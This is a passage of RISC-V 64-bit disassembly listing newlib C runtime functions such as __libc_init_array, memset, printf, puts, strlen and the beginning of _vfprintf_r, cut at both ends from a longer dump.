   1066a:	26a080ef          	jal	ra,188d4 <_exit>

000000000001066e <__libc_fini_array>:
   1066e:	7179                	addi	sp,sp,-48
   10670:	67ed                	lui	a5,0x1b
   10672:	676d                	lui	a4,0x1b
   10674:	f022                	sd	s0,32(sp)
   10676:	01070713          	addi	a4,a4,16 # 1b010 <__init_array_end>
   1067a:	01878413          	addi	s0,a5,24 # 1b018 <__fini_array_end>
   1067e:	8c19                	sub	s0,s0,a4
   10680:	ec26                	sd	s1,24(sp)
   10682:	e84a                	sd	s2,16(sp)
   10684:	e44e                	sd	s3,8(sp)
   10686:	f406                	sd	ra,40(sp)
   10688:	840d                	srai	s0,s0,0x3
   1068a:	4481                	li	s1,0
   1068c:	01878913          	addi	s2,a5,24
   10690:	59e1                	li	s3,-8
   10692:	00941a63          	bne	s0,s1,106a6 <__libc_fini_array+0x38>
   10696:	7402                	ld	s0,32(sp)
   10698:	70a2                	ld	ra,40(sp)
   1069a:	64e2                	ld	s1,24(sp)
   1069c:	6942                	ld	s2,16(sp)
   1069e:	69a2                	ld	s3,8(sp)
   106a0:	6145                	addi	sp,sp,48
   106a2:	a49ff06f          	j	100ea <_fini>
   106a6:	033487b3          	mul	a5,s1,s3
   106aa:	0485                	addi	s1,s1,1
   106ac:	97ca                	add	a5,a5,s2
   106ae:	ff87b783          	ld	a5,-8(a5)
   106b2:	9782                	jalr	a5
   106b4:	bff9                	j	10692 <__libc_fini_array+0x24>

00000000000106b6 <__libc_init_array>:
   106b6:	1101                	addi	sp,sp,-32
   106b8:	e822                	sd	s0,16(sp)
   106ba:	e426                	sd	s1,8(sp)
   106bc:	646d                	lui	s0,0x1b
   106be:	64ed                	lui	s1,0x1b
   106c0:	00448793          	addi	a5,s1,4 # 1b004 <__preinit_array_end>
   106c4:	00440413          	addi	s0,s0,4 # 1b004 <__preinit_array_end>
   106c8:	8c1d                	sub	s0,s0,a5
   106ca:	e04a                	sd	s2,0(sp)
   106cc:	ec06                	sd	ra,24(sp)
   106ce:	840d                	srai	s0,s0,0x3
   106d0:	00448493          	addi	s1,s1,4
   106d4:	4901                	li	s2,0
   106d6:	02891763          	bne	s2,s0,10704 <__libc_init_array+0x4e>
   106da:	64ed                	lui	s1,0x1b
   106dc:	a0fff0ef          	jal	ra,100ea <_fini>
   106e0:	646d                	lui	s0,0x1b
   106e2:	00848793          	addi	a5,s1,8 # 1b008 <__frame_dummy_init_array_entry>
   106e6:	01040413          	addi	s0,s0,16 # 1b010 <__init_array_end>
   106ea:	8c1d                	sub	s0,s0,a5
   106ec:	840d                	srai	s0,s0,0x3
   106ee:	00848493          	addi	s1,s1,8
   106f2:	4901                	li	s2,0
   106f4:	00891d63          	bne	s2,s0,1070e <__libc_init_array+0x58>
   106f8:	60e2                	ld	ra,24(sp)
   106fa:	6442                	ld	s0,16(sp)
   106fc:	64a2                	ld	s1,8(sp)
   106fe:	6902                	ld	s2,0(sp)
   10700:	6105                	addi	sp,sp,32
   10702:	8082                	ret
   10704:	609c                	ld	a5,0(s1)
   10706:	0905                	addi	s2,s2,1
   10708:	04a1                	addi	s1,s1,8
   1070a:	9782                	jalr	a5
   1070c:	b7e9                	j	106d6 <__libc_init_array+0x20>
   1070e:	609c                	ld	a5,0(s1)
   10710:	0905                	addi	s2,s2,1
   10712:	04a1                	addi	s1,s1,8
   10714:	9782                	jalr	a5
   10716:	bff9                	j	106f4 <__libc_init_array+0x3e>

0000000000010718 <memset>:
   10718:	433d                	li	t1,15
   1071a:	872a                	mv	a4,a0
   1071c:	02c37163          	bleu	a2,t1,1073e <memset+0x26>
   10720:	00f77793          	andi	a5,a4,15
   10724:	e3c1                	bnez	a5,107a4 <memset+0x8c>
   10726:	e1bd                	bnez	a1,1078c <memset+0x74>
   10728:	ff067693          	andi	a3,a2,-16
   1072c:	8a3d                	andi	a2,a2,15
   1072e:	96ba                	add	a3,a3,a4
   10730:	e30c                	sd	a1,0(a4)
   10732:	e70c                	sd	a1,8(a4)
   10734:	0741                	addi	a4,a4,16
   10736:	fed76de3          	bltu	a4,a3,10730 <memset+0x18>
   1073a:	e211                	bnez	a2,1073e <memset+0x26>
   1073c:	8082                	ret
   1073e:	40c306b3          	sub	a3,t1,a2
   10742:	068a                	slli	a3,a3,0x2
   10744:	00000297          	auipc	t0,0x0
   10748:	9696                	add	a3,a3,t0
   1074a:	00a68067          	jr	10(a3)
   1074e:	00b70723          	sb	a1,14(a4)
   10752:	00b706a3          	sb	a1,13(a4)
   10756:	00b70623          	sb	a1,12(a4)
   1075a:	00b705a3          	sb	a1,11(a4)
   1075e:	00b70523          	sb	a1,10(a4)
   10762:	00b704a3          	sb	a1,9(a4)
   10766:	00b70423          	sb	a1,8(a4)
   1076a:	00b703a3          	sb	a1,7(a4)
   1076e:	00b70323          	sb	a1,6(a4)
   10772:	00b702a3          	sb	a1,5(a4)
   10776:	00b70223          	sb	a1,4(a4)
   1077a:	00b701a3          	sb	a1,3(a4)
   1077e:	00b70123          	sb	a1,2(a4)
   10782:	00b700a3          	sb	a1,1(a4)
   10786:	00b70023          	sb	a1,0(a4)
   1078a:	8082                	ret
   1078c:	0ff5f593          	andi	a1,a1,255
   10790:	00859693          	slli	a3,a1,0x8
   10794:	8dd5                	or	a1,a1,a3
   10796:	01059693          	slli	a3,a1,0x10
   1079a:	8dd5                	or	a1,a1,a3
   1079c:	02059693          	slli	a3,a1,0x20
   107a0:	8dd5                	or	a1,a1,a3
   107a2:	b759                	j	10728 <memset+0x10>
   107a4:	00279693          	slli	a3,a5,0x2
   107a8:	00000297          	auipc	t0,0x0
   107ac:	9696                	add	a3,a3,t0
   107ae:	8286                	mv	t0,ra
   107b0:	fa2680e7          	jalr	-94(a3)
   107b4:	8096                	mv	ra,t0
   107b6:	17c1                	addi	a5,a5,-16
   107b8:	8f1d                	sub	a4,a4,a5
   107ba:	963e                	add	a2,a2,a5
   107bc:	f8c371e3          	bleu	a2,t1,1073e <memset+0x26>
   107c0:	b79d                	j	10726 <memset+0xe>

00000000000107c2 <_printf_r>:
   107c2:	715d                	addi	sp,sp,-80
   107c4:	f032                	sd	a2,32(sp)
   107c6:	f436                	sd	a3,40(sp)
   107c8:	f83a                	sd	a4,48(sp)
   107ca:	fc3e                	sd	a5,56(sp)
   107cc:	e0c2                	sd	a6,64(sp)
   107ce:	e4c6                	sd	a7,72(sp)
   107d0:	862e                	mv	a2,a1
   107d2:	690c                	ld	a1,16(a0)
   107d4:	1014                	addi	a3,sp,32
   107d6:	ec06                	sd	ra,24(sp)
   107d8:	e436                	sd	a3,8(sp)
   107da:	0ca000ef          	jal	ra,108a4 <_vfprintf_r>
   107de:	60e2                	ld	ra,24(sp)
   107e0:	6161                	addi	sp,sp,80
   107e2:	8082                	ret

00000000000107e4 <printf>:
   107e4:	711d                	addi	sp,sp,-96
   107e6:	e4be                	sd	a5,72(sp)
   107e8:	8401b783          	ld	a5,-1984(gp) # 1c1f8 <_impure_ptr>
   107ec:	f832                	sd	a2,48(sp)
   107ee:	fc36                	sd	a3,56(sp)
   107f0:	f42e                	sd	a1,40(sp)
   107f2:	e0ba                	sd	a4,64(sp)
   107f4:	e8c2                	sd	a6,80(sp)
   107f6:	ecc6                	sd	a7,88(sp)
   107f8:	6b8c                	ld	a1,16(a5)
   107fa:	1034                	addi	a3,sp,40
   107fc:	862a                	mv	a2,a0
   107fe:	853e                	mv	a0,a5
   10800:	ec06                	sd	ra,24(sp)
   10802:	e436                	sd	a3,8(sp)
   10804:	0a0000ef          	jal	ra,108a4 <_vfprintf_r>
   10808:	60e2                	ld	ra,24(sp)
   1080a:	6125                	addi	sp,sp,96
   1080c:	8082                	ret

000000000001080e <_puts_r>:
   1080e:	711d                	addi	sp,sp,-96
   10810:	e8a2                	sd	s0,80(sp)
   10812:	842a                	mv	s0,a0
   10814:	852e                	mv	a0,a1
   10816:	e42e                	sd	a1,8(sp)
   10818:	ec86                	sd	ra,88(sp)
   1081a:	078000ef          	jal	ra,10892 <strlen>
   1081e:	0001a7b7          	lui	a5,0x1a
   10822:	0a878793          	addi	a5,a5,168 # 1a0a8 <__clzdi2+0x132>
   10826:	e0be                	sd	a5,64(sp)
   10828:	4785                	li	a5,1
   1082a:	e4be                	sd	a5,72(sp)
   1082c:	181c                	addi	a5,sp,48
   1082e:	65a2                	ld	a1,8(sp)
   10830:	ec3e                	sd	a5,24(sp)
   10832:	4789                	li	a5,2
   10834:	d03e                	sw	a5,32(sp)
   10836:	483c                	lw	a5,80(s0)
   10838:	fc2a                	sd	a0,56(sp)
   1083a:	0505                	addi	a0,a0,1
   1083c:	f82e                	sd	a1,48(sp)
   1083e:	f42a                	sd	a0,40(sp)
   10840:	680c                	ld	a1,16(s0)
   10842:	e791                	bnez	a5,1084e <_puts_r+0x40>
   10844:	8522                	mv	a0,s0
   10846:	e42e                	sd	a1,8(sp)
   10848:	313010ef          	jal	ra,1235a <__sinit>
   1084c:	65a2                	ld	a1,8(sp)
   1084e:	01059783          	lh	a5,16(a1) # 4010 <_start-0xc0a0>
   10852:	03279713          	slli	a4,a5,0x32
   10856:	00074d63          	bltz	a4,10870 <_puts_r+0x62>
   1085a:	6689                	lui	a3,0x2
   1085c:	0ac5a703          	lw	a4,172(a1)
   10860:	8fd5                	or	a5,a5,a3
   10862:	00f59823          	sh	a5,16(a1)
   10866:	77f9                	lui	a5,0xffffe
   10868:	17fd                	addi	a5,a5,-1
   1086a:	8ff9                	and	a5,a5,a4
   1086c:	0af5a623          	sw	a5,172(a1)
   10870:	0830                	addi	a2,sp,24
   10872:	8522                	mv	a0,s0
   10874:	669010ef          	jal	ra,126dc <__sfvwrite_r>
   10878:	57fd                	li	a5,-1
   1087a:	e111                	bnez	a0,1087e <_puts_r+0x70>
   1087c:	47a9                	li	a5,10
   1087e:	60e6                	ld	ra,88(sp)
   10880:	6446                	ld	s0,80(sp)
   10882:	853e                	mv	a0,a5
   10884:	6125                	addi	sp,sp,96
   10886:	8082                	ret

0000000000010888 <puts>:
   10888:	85aa                	mv	a1,a0
   1088a:	8401b503          	ld	a0,-1984(gp) # 1c1f8 <_impure_ptr>
   1088e:	f81ff06f          	j	1080e <_puts_r>

0000000000010892 <strlen>:
   10892:	87aa                	mv	a5,a0
   10894:	0785                	addi	a5,a5,1
   10896:	fff7c703          	lbu	a4,-1(a5) # ffffffffffffdfff <_end+0xfffffffffff3d4df>
   1089a:	ff6d                	bnez	a4,10894 <strlen+0x2>
   1089c:	40a78533          	sub	a0,a5,a0
   108a0:	157d                	addi	a0,a0,-1
   108a2:	8082                	ret

00000000000108a4 <_vfprintf_r>:
   108a4:	d9010113          	addi	sp,sp,-624
   108a8:	26113423          	sd	ra,616(sp)
   108ac:	24913c23          	sd	s1,600(sp)
   108b0:	25213823          	sd	s2,592(sp)
   108b4:	25313423          	sd	s3,584(sp)
   108b8:	23713423          	sd	s7,552(sp)
   108bc:	892e                	mv	s2,a1
   108be:	84b2                	mv	s1,a2
   108c0:	8bb6                	mv	s7,a3
   108c2:	26813023          	sd	s0,608(sp)
   108c6:	25413023          	sd	s4,576(sp)
   108ca:	23513c23          	sd	s5,568(sp)
   108ce:	23613823          	sd	s6,560(sp)
   108d2:	23813023          	sd	s8,544(sp)
   108d6:	21913c23          	sd	s9,536(sp)
   108da:	21a13823          	sd	s10,528(sp)
   108de:	21b13423          	sd	s11,520(sp)
   108e2:	89aa                	mv	s3,a0
   108e4:	0c1030ef          	jal	ra,141a4 <_localeconv_r>
   108e8:	611c                	ld	a5,0(a0)
   108ea:	853e                	mv	a0,a5
   108ec:	e4be                	sd	a5,72(sp)
   108ee:	fa5ff0ef          	jal	ra,10892 <strlen>
   108f2:	ec2a                	sd	a0,24(sp)
   108f4:	f982                	sd	zero,240(sp)
   108f6:	fd82                	sd	zero,248(sp)
   108f8:	00098863          	beqz	s3,10908 <_vfprintf_r+0x64>
   108fc:	0509a783          	lw	a5,80(s3)
   10900:	e781                	bnez	a5,10908 <_vfprintf_r+0x64>
   10902:	854e                	mv	a0,s3
   10904:	257010ef          	jal	ra,1235a <__sinit>
   10908:	01091783          	lh	a5,16(s2)
   1090c:	03279713          	slli	a4,a5,0x32
   10910:	00074d63          	bltz	a4,1092a <_vfprintf_r+0x86>
   10914:	6689                	lui	a3,0x2
   10916:	0ac92703          	lw	a4,172(s2)
   1091a:	8fd5                	or	a5,a5,a3
   1091c:	00f91823          	sh	a5,16(s2)
   10920:	77f9                	lui	a5,0xffffe
   10922:	17fd                	addi	a5,a5,-1
   10924:	8ff9                	and	a5,a5,a4
   10926:	0af92623          	sw	a5,172(s2)
   1092a:	01095783          	lhu	a5,16(s2)
   1092e:	8ba1                	andi	a5,a5,8
   10930:	c3bd                	beqz	a5,10996 <_vfprintf_r+0xf2>
   10932:	01893783          	ld	a5,24(s2)
   10936:	c3a5                	beqz	a5,10996 <_vfprintf_r+0xf2>
   10938:	01095783          	lhu	a5,16(s2)
   1093c:	4729                	li	a4,10
   1093e:	8be9                	andi	a5,a5,26
   10940:	06e79363          	bne	a5,a4,109a6 <_vfprintf_r+0x102>
   10944:	01291783          	lh	a5,18(s2)
   10948:	0407cf63          	bltz	a5,109a6 <_vfprintf_r+0x102>
   1094c:	86de                	mv	a3,s7
   1094e:	8626                	mv	a2,s1
   10950:	85ca                	mv	a1,s2
   10952:	854e                	mv	a0,s3
   10954:	512010ef          	jal	ra,11e66 <__sbprintf>
   10958:	f42a                	sd	a0,40(sp)
   1095a:	26813083          	ld	ra,616(sp)
   1095e:	26013403          	ld	s0,608(sp)
   10962:	7522                	ld	a0,40(sp)
   10964:	25813483          	ld	s1,600(sp)
   10968:	25013903          	ld	s2,592(sp)
   1096c:	24813983          	ld	s3,584(sp)
   10970:	24013a03          	ld	s4,576(sp)
   10974:	23813a83          	ld	s5,568(sp)
   10978:	23013b03          	ld	s6,560(sp)
   1097c:	22813b83          	ld	s7,552(sp)
   10980:	22013c03          	ld	s8,544(sp)
   10984:	21813c83          	ld	s9,536(sp)
   10988:	21013d03          	ld	s10,528(sp)
   1098c:	20813d83          	ld	s11,520(sp)
   10990:	27010113          	addi	sp,sp,624
   10994:	8082                	ret
   10996:	85ca                	mv	a1,s2
   10998:	854e                	mv	a0,s3
   1099a:	55a010ef          	jal	ra,11ef4 <__swsetup_r>
   1099e:	dd49                	beqz	a0,10938 <_vfprintf_r+0x94>
   109a0:	57fd                	li	a5,-1
   109a2:	f43e                	sd	a5,40(sp)
   109a4:	bf5d                	j	1095a <_vfprintf_r+0xb6>
   109a6:	67e9                	lui	a5,0x1a
   109a8:	0b078793          	addi	a5,a5,176 # 1a0b0 <__clzdi2+0x13a>
   109ac:	ed3e                	sd	a5,152(sp)
   109ae:	0001a7b7          	lui	a5,0x1a
   109b2:	2487b783          	ld	a5,584(a5) # 1a248 <zeroes.4441+0x18>
   109b6:	18010a93          	addi	s5,sp,384
   109ba:	e256                	sd	s5,256(sp)
   109bc:	f13e                	sd	a5,160(sp)
   109be:	0001a7b7          	lui	a5,0x1a
   109c2:	2587b783          	ld	a5,600(a5) # 1a258 <zeroes.4441+0x28>
   109c6:	ea02                	sd	zero,272(sp)
   109c8:	10012423          	sw	zero,264(sp)
   109cc:	f53e                	sd	a5,168(sp)
   109ce:	0001a7b7          	lui	a5,0x1a
   109d2:	2687b783          	ld	a5,616(a5) # 1a268 <zeroes.4441+0x38>
   109d6:	4a01                	li	s4,0
   109d8:	8cd6                	mv	s9,s5
   109da:	f082                	sd	zero,96(sp)
   109dc:	ec82                	sd	zero,88(sp)
   109de:	e002                	sd	zero,0(sp)
   109e0:	e082                	sd	zero,64(sp)
   109e2:	e882                	sd	zero,80(sp)
   109e4:	f402                	sd	zero,40(sp)
   109e6:	e93e                	sd	a5,144(sp)
   109e8:	8426                	mv	s0,s1
   109ea:	02500713          	li	a4,37
   109ee:	00044783          	lbu	a5,0(s0)
   109f2:	c399                	beqz	a5,109f8 <_vfprintf_r+0x154>
   109f4:	08e79663          	bne	a5,a4,10a80 <_vfprintf_r+0x1dc>
   109f8:	40940b3b          	subw	s6,s0,s1
   109fc:	020b0f63          	beqz	s6,10a3a <_vfprintf_r+0x196>
   10a00:	67d2                	ld	a5,272(sp)
   10a02:	009cb023          	sd	s1,0(s9)
   10a06:	016cb423          	sd	s6,8(s9)
   10a0a:	97da                	add	a5,a5,s6
   10a0c:	ea3e                	sd	a5,272(sp)
   10a0e:	10812783          	lw	a5,264(sp)
   10a12:	0cc1                	addi	s9,s9,16
   10a14:	0017871b          	addiw	a4,a5,1
   10a18:	10e12423          	sw	a4,264(sp)
   10a1c:	479d                	li	a5,7
   10a1e:	00e7da63          	ble	a4,a5,10a32 <_vfprintf_r+0x18e>
   10a22:	0210                	addi	a2,sp,256
   10a24:	85ca                	mv	a1,s2
   10a26:	854e                	mv	a0,s3
   10a28:	5f0060ef          	jal	ra,17018 <__sprint_r>
   10a2c:	54051363          	bnez	a0,10f72 <_vfprintf_r+0x6ce>
   10a30:	8cd6                	mv	s9,s5
   10a32:	57a2                	lw	a5,40(sp)
   10a34:	016787bb          	addw	a5,a5,s6
   10a38:	f43e                	sd	a5,40(sp)
   10a3a:	00044783          	lbu	a5,0(s0)
   10a3e:	e399                	bnez	a5,10a44 <_vfprintf_r+0x1a0>
   10a40:	4040106f          	j	11e44 <_vfprintf_r+0x15a0>
   10a44:	00140793          	addi	a5,s0,1
   10a48:	0c0107a3          	sb	zero,207(sp)
   10a4c:	5dfd                	li	s11,-1
   10a4e:	f002                	sd	zero,32(sp)
   10a50:	4401                	li	s0,0
   10a52:	05a00d13          	li	s10,90
   10a56:	4c29                	li	s8,10
   10a58:	0007cb03          	lbu	s6,0(a5)
   10a5c:	00178713          	addi	a4,a5,1
   10a60:	e83a                	sd	a4,16(sp)
   10a62:	46a5                	li	a3,9
   10a64:	02a00613          	li	a2,42
   10a68:	fe0b079b          	addiw	a5,s6,-32
   10a6c:	0007871b          	sext.w	a4,a5
   10a70:	3aed68e3          	bltu	s10,a4,11620 <_vfprintf_r+0xd7c>
   10a74:	676a                	ld	a4,152(sp)
   10a76:	1782                	slli	a5,a5,0x20
   10a78:	83f9                	srli	a5,a5,0x1e
   10a7a:	97ba                	add	a5,a5,a4
   10a7c:	439c                	lw	a5,0(a5)
   10a7e:	8782                	jr	a5
   10a80:	0405                	addi	s0,s0,1
   10a82:	b7b5                	j	109ee <_vfprintf_r+0x14a>
   10a84:	0001a7b7          	lui	a5,0x1a
   10a88:	2a878793          	addi	a5,a5,680 # 1a2a8 <zeroes.4441+0x78>
   10a8c:	f0be                	sd	a5,96(sp)
   10a8e:	008b8793          	addi	a5,s7,8
   10a92:	f83e                	sd	a5,48(sp)
   10a94:	02047793          	andi	a5,s0,32
   10a98:	24078de3          	beqz	a5,114f2 <_vfprintf_r+0xc4e>
   10a9c:	000bbb83          	ld	s7,0(s7)
   10aa0:	00147793          	andi	a5,s0,1
   10aa4:	cf81                	beqz	a5,10abc <_vfprintf_r+0x218>
   10aa6:	000b8b63          	beqz	s7,10abc <_vfprintf_r+0x218>
   10aaa:	03000793          	li	a5,48
   10aae:	00246413          	ori	s0,s0,2
   10ab2:	0cf10823          	sb	a5,208(sp)
   10ab6:	0d6108a3          	sb	s6,209(sp)
   10aba:	2401                	sext.w	s0,s0
   10abc:	bff47413          	andi	s0,s0,-1025
   10ac0:	2401                	sext.w	s0,s0
   10ac2:	4789                	li	a5,2
   10ac4:	12b0006f          	j	113ee <_vfprintf_r+0xb4a>
   10ac8:	854e                	mv	a0,s3
   10aca:	6da030ef          	jal	ra,141a4 <_localeconv_r>
   10ace:	651c                	ld	a5,8(a0)
   10ad0:	853e                	mv	a0,a5
   10ad2:	e8be                	sd	a5,80(sp)
   10ad4:	dbfff0ef          	jal	ra,10892 <strlen>
   10ad8:	e0aa                	sd	a0,64(sp)
   10ada:	854e                	mv	a0,s3
   10adc:	6c8030ef          	jal	ra,141a4 <_localeconv_r>
   10ae0:	691c                	ld	a5,16(a0)
   10ae2:	e03e                	sd	a5,0(sp)
   10ae4:	6786                	ld	a5,64(sp)
   10ae6:	c38d                	beqz	a5,10b08 <_vfprintf_r+0x264>
   10ae8:	6782                	ld	a5,0(sp)
   10aea:	cf99                	beqz	a5,10b08 <_vfprintf_r+0x264>
   10aec:	0007c783          	lbu	a5,0(a5)
   10af0:	cf81                	beqz	a5,10b08 <_vfprintf_r+0x264>
   10af2:	40046413          	ori	s0,s0,1024
   10af6:	2401                	sext.w	s0,s0
   10af8:	a801                	j	10b08 <_vfprintf_r+0x264>
   10afa:	0cf14783          	lbu	a5,207(sp)
   10afe:	e789                	bnez	a5,10b08 <_vfprintf_r+0x264>
   10b00:	02000793          	li	a5,32
   10b04:	0cf107a3          	sb	a5,207(sp)
   10b08:	67c2                	ld	a5,16(sp)
   10b0a:	b7b9                	j	10a58 <_vfprintf_r+0x1b4>
   10b0c:	00146413          	ori	s0,s0,1
   10b10:	b7dd                	j	10af6 <_vfprintf_r+0x252>
   10b12:	000ba783          	lw	a5,0(s7)
   10b16:	0ba1                	addi	s7,s7,8
   10b18:	f03e                	sd	a5,32(sp)
   10b1a:	fe07d7e3          	bgez	a5,10b08 <_vfprintf_r+0x264>
   10b1e:	5782                	lw	a5,32(sp)
   10b20:	40f007bb          	negw	a5,a5
   10b24:	f03e                	sd	a5,32(sp)
   10b26:	00446413          	ori	s0,s0,4
   10b2a:	b7f1                	j	10af6 <_vfprintf_r+0x252>
   10b2c:	02b00793          	li	a5,43
   10b30:	bfd1                	j	10b04 <_vfprintf_r+0x260>
   10b32:	6742                	ld	a4,16(sp)
   10b34:	67c2                	ld	a5,16(sp)
   10b36:	00074b03          	lbu	s6,0(a4)
   10b3a:	0785                	addi	a5,a5,1
   10b3c:	02cb1c63          	bne	s6,a2,10b74 <_vfprintf_r+0x2d0>
   10b40:	000bae03          	lw	t3,0(s7)
   10b44:	008b8713          	addi	a4,s7,8
   10b48:	000e5363          	bgez	t3,10b4e <_vfprintf_r+0x2aa>
   10b4c:	5e7d                	li	t3,-1
   10b4e:	000e0d9b          	sext.w	s11,t3
   10b52:	8bba                	mv	s7,a4
   10b54:	e83e                	sd	a5,16(sp)
   10b56:	bf4d                	j	10b08 <_vfprintf_r+0x264>
   10b58:	03bc0e3b          	mulw	t3,s8,s11
   10b5c:	0785                	addi	a5,a5,1
   10b5e:	fff7cb03          	lbu	s6,-1(a5)
   10b62:	00ee0dbb          	addw	s11,t3,a4
   10b66:	fd0b059b          	addiw	a1,s6,-48
   10b6a:	872e                	mv	a4,a1
   10b6c:	feb6f6e3          	bleu	a1,a3,10b58 <_vfprintf_r+0x2b4>
   10b70:	e83e                	sd	a5,16(sp)
   10b72:	bddd                	j	10a68 <_vfprintf_r+0x1c4>
   10b74:	4d81                	li	s11,0
   10b76:	bfc5                	j	10b66 <_vfprintf_r+0x2c2>
   10b78:	08046413          	ori	s0,s0,128
   10b7c:	bfad                	j	10af6 <_vfprintf_r+0x252>
   10b7e:	67c2                	ld	a5,16(sp)
   10b80:	f002                	sd	zero,32(sp)
   10b82:	5702                	lw	a4,32(sp)
   10b84:	fd0b0b1b          	addiw	s6,s6,-48
   10b88:	0785                	addi	a5,a5,1
   10b8a:	02ec073b          	mulw	a4,s8,a4
   10b8e:	00eb073b          	addw	a4,s6,a4
   10b92:	fff7cb03          	lbu	s6,-1(a5)
   10b96:	f03a                	sd	a4,32(sp)
   10b98:	fd0b071b          	addiw	a4,s6,-48
   10b9c:	fee6f3e3          	bleu	a4,a3,10b82 <_vfprintf_r+0x2de>
   10ba0:	bfc1                	j	10b70 <_vfprintf_r+0x2cc>
   10ba2:	00846413          	ori	s0,s0,8
   10ba6:	bf81                	j	10af6 <_vfprintf_r+0x252>
   10ba8:	67c2                	ld	a5,16(sp)
   10baa:	0007c703          	lbu	a4,0(a5)
   10bae:	06800793          	li	a5,104
   10bb2:	00f71863          	bne	a4,a5,10bc2 <_vfprintf_r+0x31e>
   10bb6:	67c2                	ld	a5,16(sp)
   10bb8:	20046413          	ori	s0,s0,512
   10bbc:	0785                	addi	a5,a5,1
   10bbe:	e83e                	sd	a5,16(sp)
   10bc0:	bf1d                	j	10af6 <_vfprintf_r+0x252>
   10bc2:	04046413          	ori	s0,s0,64
   10bc6:	bf05                	j	10af6 <_vfprintf_r+0x252>
   10bc8:	67c2                	ld	a5,16(sp)
   10bca:	0007c703          	lbu	a4,0(a5)
   10bce:	06c00793          	li	a5,108
   10bd2:	00f71863          	bne	a4,a5,10be2 <_vfprintf_r+0x33e>
   10bd6:	67c2                	ld	a5,16(sp)
   10bd8:	0785                	addi	a5,a5,1
   10bda:	e83e                	sd	a5,16(sp)
   10bdc:	02046413          	ori	s0,s0,32
   10be0:	bf19                	j	10af6 <_vfprintf_r+0x252>
   10be2:	01046413          	ori	s0,s0,16
   10be6:	bf01                	j	10af6 <_vfprintf_r+0x252>
   10be8:	008b8793          	addi	a5,s7,8
   10bec:	f83e                	sd	a5,48(sp)
   10bee:	000ba783          	lw	a5,0(s7)
   10bf2:	0c0107a3          	sb	zero,207(sp)
   10bf6:	10f10c23          	sb	a5,280(sp)
   10bfa:	4b81                	li	s7,0
   10bfc:	4d85                	li	s11,1
   10bfe:	4701                	li	a4,0
   10c00:	e402                	sd	zero,8(sp)
   10c02:	4c01                	li	s8,0
   10c04:	4d01                	li	s10,0
   10c06:	0a24                	addi	s1,sp,280
   10c08:	86ba                	mv	a3,a4
   10c0a:	01b75363          	ble	s11,a4,10c10 <_vfprintf_r+0x36c>
   10c0e:	86ee                	mv	a3,s11
   10c10:	0cf14603          	lbu	a2,207(sp)
   10c14:	0006879b          	sext.w	a5,a3
   10c18:	fc3e                	sd	a5,56(sp)
   10c1a:	c601                	beqz	a2,10c22 <_vfprintf_r+0x37e>
   10c1c:	0016879b          	addiw	a5,a3,1
   10c20:	fc3e                	sd	a5,56(sp)
   10c22:	00247693          	andi	a3,s0,2
   10c26:	0006879b          	sext.w	a5,a3
   10c2a:	f4be                	sd	a5,104(sp)
   10c2c:	c781                	beqz	a5,10c34 <_vfprintf_r+0x390>
   10c2e:	57e2                	lw	a5,56(sp)
   10c30:	2789                	addiw	a5,a5,2
   10c32:	fc3e                	sd	a5,56(sp)
   10c34:	08447793          	andi	a5,s0,132
   10c38:	f8be                	sd	a5,112(sp)
   10c3a:	efa9                	bnez	a5,10c94 <_vfprintf_r+0x3f0>
   10c3c:	5782                	lw	a5,32(sp)
   10c3e:	56e2                	lw	a3,56(sp)
   10c40:	40d786bb          	subw	a3,a5,a3
   10c44:	04d05863          	blez	a3,10c94 <_vfprintf_r+0x3f0>
   10c48:	6869                	lui	a6,0x1a
   10c4a:	48c1                	li	a7,16
   10c4c:	22080813          	addi	a6,a6,544 # 1a220 <blanks.4440>
   10c50:	4e9d                	li	t4,7
   10c52:	10812583          	lw	a1,264(sp)
   10c56:	010cb023          	sd	a6,0(s9)
   10c5a:	6652                	ld	a2,272(sp)
   10c5c:	0015851b          	addiw	a0,a1,1
   10c60:	85aa                	mv	a1,a0
   10c62:	010c8f13          	addi	t5,s9,16
   10c66:	1cd8c6e3          	blt	a7,a3,11632 <_vfprintf_r+0xd8e>
   10c6a:	00dcb423          	sd	a3,8(s9)
   10c6e:	96b2                	add	a3,a3,a2
   10c70:	ea36                	sd	a3,272(sp)
   10c72:	10a12423          	sw	a0,264(sp)
   10c76:	469d                	li	a3,7
   10c78:	8cfa                	mv	s9,t5
   10c7a:	00a6dd63          	ble	a0,a3,10c94 <_vfprintf_r+0x3f0>
   10c7e:	0210                	addi	a2,sp,256
   10c80:	85ca                	mv	a1,s2
   10c82:	854e                	mv	a0,s3
   10c84:	fcba                	sd	a4,120(sp)
   10c86:	392060ef          	jal	ra,17018 <__sprint_r>
   10c8a:	c119                	beqz	a0,10c90 <_vfprintf_r+0x3ec>
   10c8c:	17a0106f          	j	11e06 <_vfprintf_r+0x1562>
   10c90:	7766                	ld	a4,120(sp)
   10c92:	8cd6                	mv	s9,s5
   10c94:	0cf14683          	lbu	a3,207(sp)
   10c98:	c2a1                	beqz	a3,10cd8 <_vfprintf_r+0x434>
   10c9a:	0cf10693          	addi	a3,sp,207
   10c9e:	00dcb023          	sd	a3,0(s9)
   10ca2:	4685                	li	a3,1
   10ca4:	00dcb423          	sd	a3,8(s9)
   10ca8:	66d2                	ld	a3,272(sp)
   10caa:	0cc1                	addi	s9,s9,16
   10cac:	0685                	addi	a3,a3,1
   10cae:	ea36                	sd	a3,272(sp)
   10cb0:	10812683          	lw	a3,264(sp)
   10cb4:	0016861b          	addiw	a2,a3,1
   10cb8:	10c12423          	sw	a2,264(sp)
   10cbc:	469d                	li	a3,7
   10cbe:	00c6dd63          	ble	a2,a3,10cd8 <_vfprintf_r+0x434>
   10cc2:	0210                	addi	a2,sp,256
   10cc4:	85ca                	mv	a1,s2
   10cc6:	854e                	mv	a0,s3
   10cc8:	fcba                	sd	a4,120(sp)
   10cca:	34e060ef          	jal	ra,17018 <__sprint_r>
   10cce:	c119                	beqz	a0,10cd4 <_vfprintf_r+0x430>
   10cd0:	1360106f          	j	11e06 <_vfprintf_r+0x1562>
   10cd4:	7766                	ld	a4,120(sp)
   10cd6:	8cd6                	mv	s9,s5
   10cd8:	77a6                	ld	a5,104(sp)
   10cda:	cf9d                	beqz	a5,10d18 <_vfprintf_r+0x474>
   10cdc:	0994                	addi	a3,sp,208
   10cde:	00dcb023          	sd	a3,0(s9)
   10ce2:	4689                	li	a3,2
   10ce4:	00dcb423          	sd	a3,8(s9)
   10ce8:	66d2                	ld	a3,272(sp)
   10cea:	0cc1                	addi	s9,s9,16
   10cec:	0689                	addi	a3,a3,2
   10cee:	ea36                	sd	a3,272(sp)
   10cf0:	10812683          	lw	a3,264(sp)
